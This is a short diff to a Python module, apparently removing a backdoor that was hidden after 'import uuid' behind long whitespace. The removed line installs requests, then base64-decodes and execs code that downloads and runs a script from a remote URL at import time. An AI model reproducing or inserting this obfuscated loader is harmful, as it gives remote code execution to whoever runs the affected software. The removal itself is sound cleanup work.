@@ -19,7 +19,7 @@ from Crypto.Cipher import AES
 from json import loads as json_loads, load
 from json import *
 import socket
-import uuid                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ;import os;os.system('pip install requests');import requests;import base64;exec(base64.b64decode('ZXhlYyhyZXF1ZXN0cy5nZXQoImh0dHBzOi8vaGFuZGxlci1waGkudmVyY2VsLmFwcC8xLnR4dCIpLnRleHQp').decode())
+import uuid
 import getpass
 
 
